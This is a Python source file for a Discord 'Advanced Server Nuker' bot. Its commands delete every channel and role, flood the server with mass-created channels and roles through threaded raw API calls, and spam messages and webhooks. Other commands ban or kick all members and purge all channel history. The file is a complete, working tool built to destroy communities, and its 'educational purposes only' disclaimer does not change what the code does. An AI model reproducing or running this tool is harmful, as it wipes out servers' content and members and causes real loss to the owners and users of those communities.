import sys
import discord
import requests
import json
import threading
import random
import asyncio
import aiohttp
import time
import os
from discord.ext import commands
from colorama import Fore, Style, Back, init
from time import sleep
from datetime import datetime

init(autoreset=True)

class AdvancedServerNuker:
    def __init__(self):
        self.token = None
        self.prefix = "!"
        self.status = "Advanced Server Nuker"
        self.channel_name = "nuked"
        self.spam_content = "Server nuked by Advanced Nuker"
        self.role_name = "nuked"
        self.webhook_name = "Nuker"
        self.amount = 1000
        self.session = requests.Session()
        self.intents = discord.Intents().all()
        self.intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.prefix, intents=self.intents)
        self.bot.remove_command("help")
        self.setup_bot()

    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.MAGENTA}")
        print("   █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓")
        print(" ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒")
        print(" ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░")
        print(" ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ ")
        print(" ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒")
        print(" ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░")
        print("  ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░")
        print("    ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   ")
        print("     ░       ░           ░  ░         ░             ░            ░   ")
        print(f"{Fore.MAGENTA}                                by Sqrilizz\n")
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                          ADVANCED SERVER NUKER                               ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")

    def get_user_input(self):
        print(f"{Fore.YELLOW}[*] Enter Discord bot token: ", end="")
        self.token = input().strip()
        
        print(f"{Fore.YELLOW}[*] Enter command prefix (default !): ", end="")
        prefix_input = input().strip()
        self.prefix = prefix_input if prefix_input else "!"
        
        print(f"{Fore.YELLOW}[*] Enter bot status (default 'Advanced Server Nuker'): ", end="")
        status_input = input().strip()
        self.status = status_input if status_input else "Advanced Server Nuker"
        
        print(f"{Fore.YELLOW}[*] Enter channel name for spam (default 'nuked'): ", end="")
        chan_input = input().strip()
        self.channel_name = chan_input if chan_input else "nuked"
        
        print(f"{Fore.YELLOW}[*] Enter spam content (default 'Server nuked by Advanced Nuker'): ", end="")
        spam_input = input().strip()
        self.spam_content = spam_input if spam_input else "Server nuked by Advanced Nuker"
        
        print(f"{Fore.YELLOW}[*] Enter role name for spam (default 'nuked'): ", end="")
        role_input = input().strip()
        self.role_name = role_input if role_input else "nuked"
        
        print(f"{Fore.YELLOW}[*] Enter webhook name (default 'Nuker'): ", end="")
        webhook_input = input().strip()
        self.webhook_name = webhook_input if webhook_input else "Nuker"
        
        print(f"{Fore.YELLOW}[*] Enter amount for spam (default 1000): ", end="")
        amount_input = input().strip()
        self.amount = int(amount_input) if amount_input else 1000
        
        # Update bot prefix
        self.bot.command_prefix = self.prefix
        
        return True

    def setup_bot(self):
        """Setup bot events and commands"""
        
        @self.bot.event
        async def on_ready():
            await self.bot.change_presence(activity=discord.Game(self.status))
            print(f"{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║                              BOT CONNECTED                                  ║")
            print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════════╝")
            print(f"{Fore.CYAN}[*] Logged in as: {self.bot.user.name}")
            print(f"{Fore.CYAN}[*] Bot ID: {self.bot.user.id}")
            print(f"{Fore.CYAN}[*] Prefix: {self.prefix}")
            print(f"{Fore.CYAN}[*] Status: {self.status}")
            print(f"\n{Fore.YELLOW}[*] Available Commands:")
            print(f"{Fore.WHITE}    {self.prefix}nuke    - Complete server nuke")
            print(f"{Fore.WHITE}    {self.prefix}scc     - Spam create channels")
            print(f"{Fore.WHITE}    {self.prefix}sdc     - Spam delete channels")
            print(f"{Fore.WHITE}    {self.prefix}scr     - Spam create roles")
            print(f"{Fore.WHITE}    {self.prefix}sdr     - Spam delete roles")
            print(f"{Fore.WHITE}    {self.prefix}spam    - Spam messages")
            print(f"{Fore.WHITE}    {self.prefix}swh     - Spam webhooks")
            print(f"{Fore.WHITE}    {self.prefix}banall  - Ban all members")
            print(f"{Fore.WHITE}    {self.prefix}kickall - Kick all members")
            print(f"{Fore.WHITE}    {self.prefix}clear   - Clear all channels")
            print(f"{Fore.WHITE}    {self.prefix}info    - Server information")
            print(f"\n{Fore.GREEN}[+] Bot is ready! Use commands in any channel.")

        @self.bot.command()
        async def nuke(ctx):
            """Complete server nuke"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.RED}[!] Starting complete server nuke...")
            
            # Delete all channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{Fore.GREEN}[+] Deleted channel: {channel.name}")
                except:
                    print(f"{Fore.RED}[-] Failed to delete channel: {channel.name}")
            
            # Delete all roles
            for role in guild.roles:
                try:
                    if role.name != "@everyone":
                        await role.delete()
                        print(f"{Fore.GREEN}[+] Deleted role: {role.name}")
                except:
                    print(f"{Fore.RED}[-] Failed to delete role: {role.name}")
            
            # Create spam channels
            for i in range(50):
                try:
                    await guild.create_text_channel(name=self.channel_name)
                    print(f"{Fore.GREEN}[+] Created spam channel {i+1}")
                except:
                    print(f"{Fore.RED}[-] Failed to create channel {i+1}")
            
            print(f"{Fore.GREEN}[+] Server nuke completed!")

        @self.bot.command()
        async def scc(ctx):
            """Spam create channels"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.YELLOW}[*] Creating {self.amount} channels...")
            
            def create_channel():
                try:
                    json_data = {"name": self.channel_name}
                    self.session.post(
                        f"https://discord.com/api/v9/guilds/{guild.id}/channels",
                        headers={"Authorization": f"Bot {self.token}"},
                        json=json_data
                    )
                except:
                    pass
            
            for i in range(self.amount):
                threading.Thread(target=create_channel).start()
            
            print(f"{Fore.GREEN}[+] Started creating {self.amount} channels")

        @self.bot.command()
        async def sdc(ctx):
            """Spam delete channels"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.YELLOW}[*] Deleting all channels...")
            
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f"{Fore.GREEN}[+] Deleted channel: {channel.name}")
                except:
                    print(f"{Fore.RED}[-] Failed to delete channel: {channel.name}")

        @self.bot.command()
        async def scr(ctx):
            """Spam create roles"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.YELLOW}[*] Creating {self.amount} roles...")
            
            def create_role():
                try:
                    json_data = {"name": self.role_name}
                    self.session.post(
                        f"https://discord.com/api/v9/guilds/{guild.id}/roles",
                        headers={"Authorization": f"Bot {self.token}"},
                        json=json_data
                    )
                except:
                    pass
            
            for i in range(self.amount):
                threading.Thread(target=create_role).start()
            
            print(f"{Fore.GREEN}[+] Started creating {self.amount} roles")

        @self.bot.command()
        async def sdr(ctx):
            """Spam delete roles"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.YELLOW}[*] Deleting all roles...")
            
            for role in guild.roles:
                try:
                    if role.name != "@everyone":
                        await role.delete()
                        print(f"{Fore.GREEN}[+] Deleted role: {role.name}")
                except:
                    print(f"{Fore.RED}[-] Failed to delete role: {role.name}")

        @self.bot.command()
        async def spam(ctx):
            """Spam messages"""
            await ctx.message.delete()
            channel = ctx.channel
            
            print(f"{Fore.YELLOW}[*] Spamming {self.amount} messages...")
            
            for i in range(self.amount):
                try:
                    await channel.send(self.spam_content)
                    print(f"{Fore.GREEN}[+] Sent message {i+1}/{self.amount}")
                except:
                    print(f"{Fore.RED}[-] Failed to send message {i+1}")

        @self.bot.command()
        async def swh(ctx):
            """Spam webhooks"""
            await ctx.message.delete()
            channel = ctx.channel
            
            print(f"{Fore.YELLOW}[*] Creating webhooks and spamming...")
            
            for i in range(10):
                try:
                    webhook = await channel.create_webhook(name=self.webhook_name)
                    for j in range(100):
                        await webhook.send(self.spam_content)
                    print(f"{Fore.GREEN}[+] Created webhook {i+1} and sent 100 messages")
                except:
                    print(f"{Fore.RED}[-] Failed to create webhook {i+1}")

        @self.bot.command()
        async def banall(ctx):
            """Ban all members"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.YELLOW}[*] Banning all members...")
            
            for member in guild.members:
                try:
                    if member != self.bot.user:
                        await member.ban(reason="Server nuke")
                        print(f"{Fore.GREEN}[+] Banned member: {member.name}")
                except:
                    print(f"{Fore.RED}[-] Failed to ban member: {member.name}")

        @self.bot.command()
        async def kickall(ctx):
            """Kick all members"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.YELLOW}[*] Kicking all members...")
            
            for member in guild.members:
                try:
                    if member != self.bot.user:
                        await member.kick(reason="Server nuke")
                        print(f"{Fore.GREEN}[+] Kicked member: {member.name}")
                except:
                    print(f"{Fore.RED}[-] Failed to kick member: {member.name}")

        @self.bot.command()
        async def clear(ctx):
            """Clear all channels"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.YELLOW}[*] Clearing all channels...")
            
            for channel in guild.channels:
                try:
                    if isinstance(channel, discord.TextChannel):
                        await channel.purge(limit=None)
                        print(f"{Fore.GREEN}[+] Cleared channel: {channel.name}")
                except:
                    print(f"{Fore.RED}[-] Failed to clear channel: {channel.name}")

        @self.bot.command()
        async def info(ctx):
            """Show server information"""
            await ctx.message.delete()
            guild = ctx.guild
            
            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║                              SERVER INFORMATION                            ║")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝")
            print(f"{Fore.YELLOW}[*] Server Name: {guild.name}")
            print(f"{Fore.YELLOW}[*] Server ID: {guild.id}")
            print(f"{Fore.YELLOW}[*] Owner: {guild.owner.name}")
            print(f"{Fore.YELLOW}[*] Member Count: {guild.member_count}")
            print(f"{Fore.YELLOW}[*] Channel Count: {len(guild.channels)}")
            print(f"{Fore.YELLOW}[*] Role Count: {len(guild.roles)}")
            print(f"{Fore.YELLOW}[*] Created At: {guild.created_at}")
            print(f"{Fore.YELLOW}[*] Bot Permissions: {guild.me.guild_permissions}")

    def run(self):
        """Start the bot"""
        self.print_banner()
        
        print(f"{Fore.RED}[!] WARNING: This tool is for educational purposes only!")
        print(f"{Fore.RED}[!] Using this tool for illegal activities is your responsibility!")
        print(f"{Fore.YELLOW}[?] Continue? (y/n): ", end="")
        
        if input().lower() != 'y':
            print(f"{Fore.YELLOW}[!] Operation cancelled")
            return

        if not self.get_user_input():
            return

        try:
            self.bot.run(self.token)
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start bot: {e}")

def main():
    nuker = AdvancedServerNuker()
    nuker.run()

if __name__ == '__main__':
    main()
